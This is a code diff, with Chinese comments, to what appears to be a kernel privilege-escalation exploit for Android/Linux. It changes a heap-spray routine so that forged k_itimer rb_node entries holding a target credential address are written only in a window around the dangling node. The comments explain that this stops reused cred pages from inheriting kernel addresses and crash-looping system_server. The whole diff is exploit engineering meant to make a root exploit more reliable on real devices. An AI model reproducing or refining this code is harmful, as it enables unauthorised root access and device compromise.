@@ -1168,6 +1168,14 @@ int pc98260_run_rootd(void);
  *   g_plant_cred=0  以 24 字节步长铺 k_itimer 的 rb_node，让悬挂节点指向 target。
  * 返回 0 成功；-1 表示该页布局放不下（已打印原因）。
  */
+
+/*
+ * 铺页窗口半径（字节）：#6 收窄后只在 node_off ±SPAN 内写 target（见 else 分支）。
+ * 太小 → 对 node_off 漂移容错差、命中率降；太大 → 又回到整页散弹、脏 cred 风险回升。
+ * 真机可据此回调，默认 0x200（约把脏地址足迹缩到 ~1/8）。
+ */
+#define STREAM_TILE_SPAN 0x200u
+
 static int build_stream_pattern(unsigned char *pat, unsigned node_off,
 				uint64_t base, uint64_t target, uint64_t victim)
 {
@@ -1223,14 +1231,34 @@ static int build_stream_pattern(unsigned char *pat, unsigned node_off,
 			"[cred] node=%#" PRIx64 " task+cred=%#" PRIx64 " off=%#x\n",
 			node_kva, g_task + TASK_CRED, node_off);
 	} else {
+		/*
+		 * 收窄铺页范围（#6 负数 uid 重启）：悬挂 k_itimer 真正解引用的只有
+		 * node_off 处那一个 rb_node（node[2]=rb_left=target 是关键的一跳）。
+		 * 历史实现把整页 8KB 每 24 字节都铺上 {0,0,target}，纯属冗余散弹；一旦
+		 * 这页被 free 后又被 cred_jar 复用，struct cred.uid（偏移 8）就可能落在
+		 * 某个 node[2] 槽上，继承一个内核地址 → system_server 读到负 userId，
+		 * 陷入每分钟一次的崩溃循环（软重启清不掉，须完整内核重启）。
+		 *
+		 * 现在只在 node_off ±STREAM_TILE_SPAN 窗口内铺 target，窗口外保持 memset
+		 * 的 0：保留对 node_off 轻微漂移的容错，同时把脏地址足迹缩小约一个量级。
+		 */
 		unsigned align = node_off % 24u;
+		unsigned lo = node_off > STREAM_TILE_SPAN
+				? node_off - STREAM_TILE_SPAN : 0u;
+		unsigned hi = node_off + STREAM_TILE_SPAN;
+		if (hi > 8192u)
+			hi = 8192u;
 		for (unsigned off = align; off + 24 <= 8192; off += 24) {
-			uint64_t *node = (uint64_t *)(pat + off);
+			uint64_t *node;
+			if (off < lo || off >= hi)
+				continue;
+			node = (uint64_t *)(pat + off);
 			node[0] = 0;
 			node[1] = 0;
 			node[2] = target;
 		}
-		dprintf(STDOUT_FILENO, "[stream_backfill] tile align=%u off=%#x\n", align, node_off);
+		dprintf(STDOUT_FILENO,
+			"[stream_backfill] tile win=[%u,%u) off=%#x\n", lo, hi, node_off);
 	}
 	return 0;
 }
